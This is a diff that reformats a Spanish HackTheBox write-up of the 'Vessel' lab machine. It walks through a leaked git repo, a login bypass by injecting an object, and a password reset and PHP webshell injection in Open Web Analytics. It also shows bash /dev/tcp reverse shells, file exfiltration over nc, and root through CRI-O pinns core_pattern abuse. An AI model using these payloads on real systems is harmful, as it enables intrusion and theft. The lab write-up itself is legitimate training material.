@@ -1,20 +1,18 @@
 ---
-machine_name: Vessel
-platform: HackTheBox
+categories: ['HackTheBox', 'Hard', 'Linux']
 title: "Máquina Vessel"
-category: writeup
-difficulty: "Difícil"
 description: "Resolución de la máquina Vessel"
 tags: ["Git repo leak", "Code analysis", "SQLi", "CVE-2022-24637", "pyinstaller extraction", "Password guessing", "CVE-2022-0811"]
+logo: '/assets/writeups/vessel/logo.png'
 ---
 
 En esta máquina Linux encontraremos un sitio con un repositorio Git expuesto y analizaremos un código propenso a SQLi que nos permitirá acceder al panel del sitio, luego accederemos a un OpenWebAnalytics vulnerable al CVE-2022-24637 que nos permitirá reiniciar la contraseña del usuario administrador y ganar una consola interactiva en la máquina; ya en esta encontraremos un programa Python compilado con pyinstaller para Windows usado para generar la contraseña de un PDF, pero al no generar contraseñas completamente aleatorias nos dará la contraseña para acceder al documento y encontraremos credenciales por SSH. Finalmente "abusaremos" del CVE-2022-0811 de CRI-O para escalar privilegios.
 
-<h2>RECONOCIMIENTO</h2>
+## RECONOCIMIENTO 
 
 Con un escaneo nmap veremos que la máquina solo tiene dos puertos abiertos.
 
-{% highlight bash %}
+ ```bash
 # Nmap 7.93 scan initiated Mon Mar 27 16:07:50 2023 as: nmap -sS -Pn -n -vvv -p- --open --min-rate 100 -oN ports 10.10.11.178
 Nmap scan report for 10.10.11.178
 Host is up, received user-set (0.49s latency).
@@ -27,7 +25,7 @@ PORT   STATE SERVICE REASON
 
 Read data files from: /usr/bin/../share/nmap
 # Nmap done at Mon Mar 27 16:10:02 2023 -- 1 IP address (1 host up) scanned in 131.58 seconds
-{% endhighlight %}
+ ```
 
 El sitio web que tiene parece ser de desarrollo y venta de proyectos a pequeñas y grandes compañías:
 
@@ -39,11 +37,11 @@ Usa el dominio "vessel.htb" y tiene un panel de registro y autenticación, pero 
 
 Usa Express con Apache de proxy reverso, pero esto no parece tener alguna cosa interesante por lo que...
 
-<h2>INTRUSIÓN</h2>
+## INTRUSIÓN 
 
 Si fuzzeamos la web encontraremos un directorio llamado `dev`
 
-{% highlight bash %}
+ ```bash
 #ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 26 -u http://10.10.11.178/FUZZ
 ...
 img                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 191ms]
@@ -59,13 +57,13 @@ logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 12
 401                     [Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 248ms]
 Register                [Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 152ms]
 500                     [Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 345ms]
-{% endhighlight %}
+ ```
 
 Intentando entrar por la web simplemente nos retorna un 404, pero este directorio parece existir en la carpeta en donde Apache hostea el contenido y no en el sitio detrás de él, por lo que intentaremos buscar si existen archivos.
 
 Curiosamente aunque nos muestre que la carpeta .git no existe, si intentamos descargárnos el HEAD lo obtendremos sin problemas:
 
-{% highlight bash %}
+ ```bash
 ❯ curl -v http://10.10.11.178/dev/.git/HEAD
 *   Trying 10.10.11.178:80...
 * Connected to 10.10.11.178 (10.10.11.178) port 80 (#0)
@@ -88,11 +86,11 @@ Curiosamente aunque nos muestre que la carpeta .git no existe, si intentamos des
 < 
 ref: refs/heads/master
 * Connection #0 to host 10.10.11.178 left intact
-{% endhighlight %}
+ ```
 
 Al tener archivos de un repositorio utilizaré [git-dumper](https://github.com/arthaud/git-dumper) para descargar los archivos:
 
-{% highlight bash %}
+ ```bash
 ❯ git-dumper http://10.10.11.178/dev dev
 [-] Testing http://10.10.11.178/dev/.git/HEAD [200]
 [-] Testing http://10.10.11.178/dev/.git/ [302]
@@ -124,13 +122,13 @@ drwxr-xr-x 7 vzon vzon 4096 mar 27 16:33 .git
 drwxr-xr-x 5 vzon vzon 4096 mar 27 16:33 public
 drwxr-xr-x 2 vzon vzon 4096 mar 27 16:33 routes
 drwxr-xr-x 2 vzon vzon 4096 mar 27 16:33 views
-{% endhighlight %}
+ ```
 
 El repositorio que nos construye es de un proyecto que utiliza Express, es el código del backend de la web. Vamos a husmear un poco...
 
 Analizando el código en busca de vulnerabilidades encontramos credenciales del usuario de la base de datos en el archivo `config/db.js` y una parte interesante de la ruta de autenticación:
 
-{% highlight js %}
+ ```javascript
 //routes/index.js:60
 ...
 router.post('/api/login', function(req, res) {
@@ -155,7 +153,7 @@ router.post('/api/login', function(req, res) {
 	}
 });
 ...
-{% endhighlight %}
+ ```
 
 Está usando parametrización de queries pero aún así esto es inseguro, te dejo que pienses que puede estar mal antes de que sigas leyendo.
 
@@ -165,33 +163,33 @@ El driver `mysqljs` de Node trata los tipos de JavaScript como son; números son
 
 Los datos por POST que se le envían al servidor son estos:
 
-{% highlight bash %}
+ ```bash
 username=pepito&password=123
-{% endhighlight %}
+ ```
 
 Dos varchars, esto en SQL sería traducido a
 
-{% highlight sql %}
+ ```sql
 SELECT * FROM users WHERE username = "pepito" AND password = "123";
-{% endhighlight %}
+ ```
 
 Vale todo normal, pero ahora como se vería si metiera un objeto?
 
-{% highlight sql %}
+ ```sql
 SELECT * FROM users WHERE username = "pepito" AND password = `key` = "value";
-{% endhighlight %}
+ ```
 
 Jugemos un poco más
 
-{% highlight sql %}
+ ```sql
 SELECT * FROM users WHERE username = "pepito" AND password = `password` = 1;
-{% endhighlight %}
+ ```
 
 Esto en SQL es completamente válido, y la última query sería tomada por el servidor como una condición verdadera porque está comparando una columna con un 1 (true), por lo que para poder explotar esto habría que introducir un objeto a la query por POST, sería similar a esto en formato de formulario URL:
 
-{% highlight bash %}
+ ```bash
 username=pepito&password[password]=1
-{% endhighlight %}
+ ```
 
 Cambiando el parametro user a "admin" y enviando la petición el servidor nos concede el acceso a un panel de administración
 
@@ -207,30 +205,30 @@ Primero que nada, esta vulnerabilidad ocurre porque el interprete de PHP no trat
 
 Vamos a autenticarnos como el usuario admin para generarle un cache:
 
-{% highlight bash %}
+ ```bash
 ❯ curl -v -d "owa_user_id=admin&owa_password=admin&owa_action=base.login" 'http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm'
-{% endhighlight %}
+ ```
 
 El caché generado puedes encontrarlo en la ruta `/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php`. El hash que ves en la ruta es de tipo md5 hex y es el resultado de la combinación `user_id1`; La ID del usuario administrador es 1.
 
 Haciendo una petición a esa ruta encontraremos el caché:
 
-{% highlight bash %}
+ ```bash
 ❯ curl 'http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php'
 <?php\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI...
-{% endhighlight %}
+ ```
 
 Decodificando el base64 vemos que es un objeto PHP "owa_user" serializado y si vemos bien encontraremos la contraseña temporal:
 
-{% highlight php %}
+ ```php
 ...ss:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"0acfc1e6455e1a57d57385f7e1fae3b8"...
-{% endhighlight %}
+ ```
 
 *NOTA: También está el hash de la contraseña actual pero no nos interesa por ahora*
 
 Luego haremos una petición a la URL `http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersPasswordEntry` por POST para reiniciar la contraseña de admin, yo usaré este script feo para hacerlo:
 
-{% highlight bash %}
+ ```bash
 #!/bin/bash
 #El archivo "cache" es el cache obtenido codificado en base64.
 
@@ -240,7 +238,7 @@ echo "Temporal password is $temppass"
 echo "See the request"
 
 curl -v -d "owa_password=admin&owa_password2=admin&owa_k=$temppass&owa_action=base.usersChangePassword" 'http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersPasswordEntry'
-{% endhighlight %}
+ ```
 
 Después de ejecutarla e ir al sitio donde nos manda el aplicativo nos dice que:
 
@@ -258,15 +256,15 @@ Primero necesitaremos la ubicación de los logs, según el sitio es:
 
 En el servidor web sería reflejado como `http://openwebanalytics.vessel.htb/owa-data/logs/`, vale... ahora vamos a alterar el formato de generación de logs aprovechandonos de una falla de asignación en masa, para esto necesitaremos interceptar las peticiones que se hacen cuando cambiamos ajustes. Esto se envia por POST cuando hacemos dicha acción:
 
-{% highlight bash %}
+ ```bash
 owa_config%5Bbase.resolve_hosts%5D=0&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=5a038d6bf2&owa_action=base.optionsUpdate&owa_module=base
-{% endhighlight %}
+ ```
 
 Si agregamos `base.error_log_file` y `base.error_log_level` aunque no estén en el formulario original de configuración, los va a actualizar.
 
-{% highlight bash %}
+ ```bash
 owa_config%5Bbase.resolve_hosts%5D=0&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0"&owa_config%5Bbase.error_log_level%5D=2&owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/myfile.php"&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=5a038d6bf2&owa_action=base.optionsUpdate&owa_module=base
-{% endhighlight %}
+ ```
 
 El sitio guardará los ajustes sin problemas y si intentamos ver si el archivo nuevo de logs existe pues
 
@@ -274,9 +272,9 @@ El sitio guardará los ajustes sin problemas y si intentamos ver si el archivo n
 
 Ahora solamente tenemos que hacer un intento de autenticación con algún código PHP de nombre de usuario, al hacerlo el sitio interpretará eso como código:
 
-{% highlight bash %}
+ ```bash
 ❯ curl -v -d "owa_user_id=<%3fphp+echo+system(\$_GET['cmd'])%3b+%3f>&owa_password=<%3fphp+echo+system(\$_GET['cmd'])%3b+%3f>&owa_action=base.login" 'http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm'
-{% endhighlight %}
+ ```
 
 ![Pwned](/assets/writeups/vessel/9.png)
 
@@ -284,7 +282,7 @@ Introduzcamos nuestro tipico one liner de bash para ganar acceso:
 
 `http://openwebanalytics.vessel.htb/owa-data/logs/myfile.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.14.82/443+0%3E%261%22`
 
-{% highlight bash %}
+ ```bash
 ❯ nc -lvnp 443
 Connection from 10.10.11.178:59176
 bash: cannot set terminal process group (1010): Inappropriate ioctl for device
@@ -299,22 +297,22 @@ www-data@vessel:/var/www/html/owa/owa-data/logs$ ^Z #CTRL+Z
                                     reset xterm #Reiniciar la terminal
 www-data@vessel:/var/www/html/owa/owa-data/logs$ export TERM=xterm #Establecer el tipo de terminal
 www-data@vessel:/var/www/html/owa/owa-data/caches$ stty rows 37 columns 151 #Establecer filas y columnas de la tty
-{% endhighlight %}
+ ```
 
 Husmeando el contenido de la maquina encontramos dos usuarios, y tenemos permisos de lectura en el directorio de uno:
 
-{% highlight bash %}
+ ```bash
 www-data@vessel:/home$ ls -la
 total 16
 drwxr-xr-x  4 root   root   4096 Aug 11  2022 .
 drwxr-xr-x 19 root   root   4096 Aug 11  2022 ..
 drwx------  5 ethan  ethan  4096 Aug 11  2022 ethan
 drwxrwxr-x  3 steven steven 4096 Aug 11  2022 steven
-{% endhighlight%}
+ ```
 
 En la carpeta personal de steven hay un archivo llamado passwordGenerator que es un ejecutable PE32 para Windows
 
-{% highlight bash %}
+ ```bash
 www-data@vessel:/home/steven$ ls -la
 total 33796
 drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
@@ -327,18 +325,18 @@ drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
 -rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator
 www-data@vessel:/home/steven$ file passwordGenerator
 passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
-{% endhighlight %}
+ ```
 
 También hay un directorio `.notes` que contiene un documento PDF y una imagen PNG, vamos a descargarnos esto
 
-{% highlight bash %}
+ ```bash
 www-data@vessel:/home/steven/.notes$ ls
 notes.pdf  screenshot.png
 www-data@vessel:/home/steven/.notes$ cat notes.pdf | nc 10.10.14.82 443 #Inicio un listener en mi máquina y mando el archivo al listener.
 ^C
 www-data@vessel:/home/steven/.notes$ cat screenshot.png | nc 10.10.14.82 443
 ^C
-{% endhighlight %}
+ ```
 
 La imagen simplemente es una captura de lo que puede ser el programa passwordGenerator que vimos anteriormente
 
@@ -348,7 +346,7 @@ Mientras que el PDF está protegido con contraseña... pero con cuál contraseñ
 
 Si hacemos un poco de ingeniería inversa a este artefacto pasándolo a nuestra máquina y miramos sus cadenas imprimibles con `strings` encontramos algo interesante:
 
-{% highlight bash %}
+ ```bash
 ❯ strings passwordGenerator.exe | tail -n 30
 bselect.pyd
 bshiboken2.abi3.dll
@@ -380,13 +378,13 @@ xPySide2\translations\qtbase_zh_TW.qm
 xbase_library.zip
 zPYZ-00.pyz
 3python37.dll
-{% endhighlight %}
+ ```
 
 Tiene un DLL de Python 3.7 incluido junto a unos archivos de PySide2 por lo que este programa pudo haber sido antes un simple proyecto de Python que fue compilado con [pyinstaller](https://pypi.org/project/pyinstaller/). Afortunadamente existe una herramienta llamada [pyinstextractor](https://github.com/extremecoders-re/pyinstxtractor) para extraer los recursos de este tipo de programas.
 
 Al utilizarla nos extrae mucho contenido:
 
-{% highlight bash %}
+ ```bash
 ❯ python pyinstxtractor.py passwordGenerator.exe
 [+] Processing passwordGenerator.exe
 [+] Pyinstaller version: 2.1+
@@ -423,11 +421,11 @@ drwxr-xr-x 3 vzon vzon     4096 mar 28 15:13 ..
 -rw-r--r-- 1 vzon vzon 15995904 mar 28 15:13 opengl32sw.dll
 -rw-r--r-- 1 vzon vzon     7910 mar 28 15:13 passwordGenerator.pyc
 ...
-{% endhighlight %}
+ ```
 
 Ahora tenemos un conjunto de archivos pyc que se pueden decompilar, entre ellos el más interesante es el `passwordGenerator.pyc` por lo que vamos a decompilarlo usando una [herramienta web](https://www.toolnb.com/tools-lang-en/pyc.html):
 
-{% highlight python %}
+ ```python
 # uncompyle6 version 3.5.0
 # Python bytecode 3.7 (3394)
 # Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) 
@@ -602,7 +600,7 @@ if __name__ == '__main__':
     mainwindow = MainWindow()
     mainwindow.show()
     app.exec_()
-{% endhighlight %}
+ ```
 
 De todo este montón de código la parte que nos interesa es el método `#genPassword(self)`, analizándolo vemos que primero compara que juego de carácteres hemos seleccionado en el programa y la longitud de la contraseña, luego la genera iterando por el juego de carácteres seleccionado dividiendo el tamaño del charset por el valor devuelto de la función `qrand()`
 
@@ -610,7 +608,7 @@ Esta función es implementada de la librería PySide, genera un número aleatori
 
 Vamos a adaptar un método para generar todas las combinaciones posibles en base a la imagen que tenemos a una función usable como script:
 
-{% highlight python %}
+ ```python
 from PySide2.QtCore import *
 
 def genPassword(file, x):
@@ -640,13 +638,13 @@ for x in range(1000):
 
 handle.close()
 
-{% endhighlight %}
+ ```
 
 Aquí hay un pequeño problema y es que el generador de números aleatorios de Qt funciona de una forma distinta según el sistema operativo, y según vimos en el screenshot parece que la contraseña fue generada en Windows por lo que para asesorarnos ejecutaremos el script en dicho sistema operativo.
 
 Si lo ejecutamos nos genera las contraseñas:
 
-{% highlight powershell %}
+ ```powershell
 PS C:\Users\samua\Downloads\things> python script.py
 PS C:\Users\samua\Downloads\things> cat passwords.txt
 m#5isx?%l>^#-O%[te9<0dcHi{tPY9r5
@@ -656,13 +654,13 @@ w=mNA|]H)@&U#@o>LFixa(Hfnolf;o6:
 z5Oe[D}RN6K@ro4^Y]<0i$*Pe!7aTcgV
 3j~!*N+b9$pTFg*jl:u-6tr.l,]lsQHw
 ...
-{% endhighlight %}
+ ```
 
 Tengo WSL (Windows Subsystem for Linux) instalado en mi máquina por lo que lo usaré para utilizar la herramienta para efectuar brute-force.
 
 Obteniendo el hash del pdf con pdf2john e inténtandolo crackear con el mismo John obtenemos la combinación correcta
 
-{% highlight bash %}
+ ```bash
 ┌──(vzon㉿DESKTOP-U00V****)-[~]                                                               
 └─$ john -w=passwords.txt hash                                                               
 Using default input encoding: UTF-8                                                          
@@ -671,7 +669,7 @@ Cost 1 (revision) is 3 for all loaded hashes
 Will run 4 OpenMP threads                                                                    
 Press 'q' or Ctrl-C to abort, almost any other key for status                                
 YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS (note.pdf)
-{% endhighlight %}
+ ```
 
 Al utilizarla en el PDF ya nos permite verlo
 
@@ -681,7 +679,7 @@ Es una conversación entre Steven y Ethan en la cual el último dice que estará
 
 Utilizando estas credenciales por SSH obtenemos acceso como el usuario ethan y podremos ver la primera flag
 
-{% highlight bash %}
+ ```bash
 ❯ /usr/bin/ssh ethan@vessel.htb
 ethan@vessel.htb\'s password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-124-generic x86_64)
@@ -713,15 +711,15 @@ ethan@vessel:~$ ls
 user.txt
 ethan@vessel:~$ cat user.txt
 4edf7d1e16f35225f39a6006********
-{% endhighlight %}
+ ```
 
 Estuvo bastante entretenida la intrusión, ahora vamos a convertirnos en root
 
-<h2>ESCALADA DE PRIVILEGIOS</h2>
+## ESCALADA DE PRIVILEGIOS 
 
 Buscando por binarios con el bit SUID activo encontramos uno inusual llamado "pinns"
 
-{% highlight bash %}
+ ```bash
 ethan@vessel:~$ find / -perm -4000 2>/dev/null
 /usr/lib/eject/dmcrypt-get-device
 /usr/lib/openssh/ssh-keysign
@@ -739,7 +737,7 @@ ethan@vessel:~$ find / -perm -4000 2>/dev/null
 /usr/bin/mount
 /usr/bin/su
 /usr/bin/pinns
-{% endhighlight %}
+ ```
 
 Buscando por internet a ver si le pertenece a algún programa vemos que es una utilidad de CRI-O (Container Runtime Interface using Open Container Initiative) para manipular los namespaces de Linux, y también encontramos un [artículo interesante](https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/) de la página CrowdStrike:
 
@@ -753,7 +751,7 @@ pero como no valida bien ni sanitiza los parametros que se le pasan a pinns un a
 
 El sitio nos muestra como explotarlo usando Kubernetes + minikube con CRI-O de runtime, utiliza el parametro del kernel `kernel.core_pattern` para ejecutar un script cuando un Core Dump ocurra (este evento normalmente ocurre cuando un programa termina con un Segmentation Fault). Vessel no tiene Kubernetes instalado pero si CRI-O junto a runc
 
-{% highlight bash %}
+ ```bash
 ethan@vessel:~$ crio --version
 crio version 1.19.6
 Version:       1.19.6
@@ -769,14 +767,14 @@ runc version 1.1.0-0ubuntu1~20.04.1
 spec: 1.0.2-dev
 go: go1.16.2
 libseccomp: 2.5.1
-{% endhighlight %}
+ ```
 
 Sin embargo analizando bien el binario pinns de Vessel es **distinto al original** porque:
 
 - El original no tiene el bit SUID establecido
 - Sus hashes sha256 son distintos
 
-{% highlight bash %}
+ ```bash
 #Ambos probados en la misma versión 1.19.6
 # ---
 #Vessel
@@ -786,21 +784,21 @@ ethan@vessel:~$ sha256sum $(which pinns)
 #Original
 root@cs-95777541684-default:/home/samu# sha256sum $(which pinns)
 562b0ac4ae7d72cd350965f279002370673b06e2a83d635e77f4d9e9a8eb64d3  /usr/bin/pinns
-{% endhighlight %}
+ ```
 
 Es extraño esto, pero la buena parte es que el pinns de Vessel al tener el bit SUID nos da la posibilidad de poder intentar fijar un namespace y establecer la opción de sysctl `kernel.core_pattern` manualmente para llegar a ejecutar comandos como root, pero primero debemos ver como funciona el binario, si lo ejecutamos nos pide primero un path para fijar namespaces:
 
-{% highlight bash %}
+ ```bash
 ethan@vessel:~$ pinns
 [pinns:e]: Path for pinning namespaces not specified: Invalid argument
-{% endhighlight %}
+ ```
 
 Introduciendo un "--help" solo hacemos que el binario no haga nada.
 
-{% highlight bash %}
+ ```bash
 ethan@vessel:~$ pinns --help
 ethan@vessel:~$ 
-{% endhighlight %}
+ ```
 
 En fossies.org podremos encontrar lo que parece ser el código fuente del binario original de CRI-O, el de Vessel no debería diferir mucho por lo que vamos a guiarnos de aquí.
 
@@ -808,7 +806,7 @@ En fossies.org podremos encontrar lo que parece ser el código fuente del binari
 
 Analizando encontramos los que parecen ser los argumentos del programa, estos para eligir cuales namespaces fijar y otras opciones si miramos más abajo en el código...
 
-{% highlight c %}
+ ```sqlc %}
 static const struct option long_options[] = {
   {"help", no_argument, NULL, 'h'},
   {"uts", optional_argument, NULL, 'u'},
@@ -823,18 +821,18 @@ static const struct option long_options[] = {
   {"gid-mapping", optional_argument, NULL, GID_MAPPING},
   {"sysctl", optional_argument, NULL, 's'},
 };
-{% endhighlight %}
+ ```
 
 Si le especificamos el directorio nos va a pedir un nombre de archivo, y si creamos el archivo nos va a pedir ahora un namespace para fijar:
 
-{% highlight bash %}
+ ```bash
 ethan@vessel:/tmp$ mkdir test
 ethan@vessel:/tmp$ pinns -d test
 [pinns:e]: Filename for pinning namespaces not specified: Invalid argument
 ethan@vessel:/tmp$ touch test/filetest
 ethan@vessel:/tmp$ pinns -d test -f test/filetest
 [pinns:e] No namespace specified for pinning
-{% endhighlight %}
+ ```
 
 Supongamos que debe ser una de las opciones de ipc, mnt, cgroup, net... etc. Ahora para llegar a ejecutar un comando podriamos intentar usar la opción `-s` con la cual especificaremos un `kernel.core_pattern` personalizado para ejecutar un script que creemos, simplemente debemos iniciar el valor de dicho argumento con un "\|" y del resto poner la ruta al script:
 
@@ -842,32 +840,32 @@ Supongamos que debe ser una de las opciones de ipc, mnt, cgroup, net... etc. Aho
 
 Vamos a crear dicho archivo con un comando mágico para que me devuelva una reverse shell a mi equipo, no te olvides de darle permisos de ejecución:
 
-{% highlight bash %}
+ ```bash
 #!/bin/bash
 
 bash -c "bash -i >& /dev/tcp/10.10.14.82/443 0>&1"
-{% endhighlight %}
+ ```
 
 Al ejecutar pinns con los parametros que deducimos finalmente nos mostrará un error, pero si vemos la propiedad core_pattern...
 
-{% highlight bash%}
+```bash
 ethan@vessel:/tmp$ pinns -s "kernel.core_pattern=|/tmp/malicious.sh" -i -d test -f test/filetest
 [pinns:w]: Failed to create ns file: No such file or directory
 ethan@vessel:/tmp$ cat /proc/sys/kernel/core_pattern 
 |/tmp/malicious.sh
-{% endhighlight %}
+ ```
 
 Se cambió con éxito, asi que ahora provoquemos un fallo de segmentación a ver si nos ejecuta el comando:
 
-{% highlight bash %}
+ ```bash
 ethan@vessel:/tmp$ sleep 9999 &
 [1] 16809
 ethan@vessel:/tmp$ kill -s SIGSEGV 16809
-{% endhighlight %}
+ ```
 
 **Mientras tanto en nuestra máquina**
 
-{% highlight bash %}
+ ```bash
 ❯ nc -lvnp 443
 Connection from 10.10.11.178:33534
 bash: cannot set terminal process group (-1): Inappropriate ioctl for device
@@ -882,39 +880,39 @@ root@vessel:/# ^Z
                                    reset xterm
 root@vessel:/# export TERM=xterm-256color
 root@vessel:/# stty rows 37 columns 151
-{% endhighlight %}
+ ```
 
 ¡Et voilà! El comando se ejecutó exitósamente por lo que ya podremos tomar la última flag
 
-{% highlight bash %}
+ ```bash
 root@vessel:/# cd root
 root@vessel:/root# cat root.txt
 ad212534303c7741a41d62c9********
-{% endhighlight %}
+ ```
 
-<h2>EXTRA</h2>
+## EXTRA 
 
 Me puse a buscar en donde estaba el directorio `dev` en la ruta `/var/www/html/vessel/` pero extrañamente no encontré algo
 
-{% highlight bash %}
+ ```bash
 root@vessel:/var/www/html/vessel/vessel# ls
 config  index.js  public  routes  views
-{% endhighlight %}
+ ```
 
 Viendo la configuración de Apache me tope con que tiene el DocumentRoot puesto en `/var/www/html/vessel/vessel`, el mismo directorio en donde están los archivos de arriba... pero el sitio solamente me devuelve un 404 si intento hacer referencia a alguno de los ficheros antes mencionados, supongo porque solamente tiene una instrucción ProxyPass puesta.
 
 Buscando mas a fondo el repositorio logre encontrarlo:
 
-{% highlight bash %}
+ ```bash
 root@vessel:/# find / -name .git 2>/dev/null
 /var/www/html/vessel/vessel/public/dev/.git
-{% endhighlight %}
+ ```
 
 Está en la ruta public, y es esa ruta la que Express usa para proveer archivos estáticos por lo que al ser una carpeta supongo que el Apache intenta redirigirte a ella con el backslash al final, pero para Express las rutas estáticas que sean carpetas no existen asi que terminará mandando un 404 a menos que referencies un archivo directamente.
 
 El archivo de ExploitDB para explotar de forma automatizada el CVE-2022-24637 tiene el identificador 51026.
 
-{% highlight bash %}
+ ```bash
 ❯ searchsploit Open Web Analytics
 --------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                       |  Path
@@ -924,4 +922,4 @@ Open Web Analytics 1.5.4 - 'owa_email_address' SQL Injection                    
 Open Web Analytics 1.7.3 - Remote Code Execution  - $this                                                           | php/webapps/51026.py
 --------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-{% endhighlight %}
+ ```
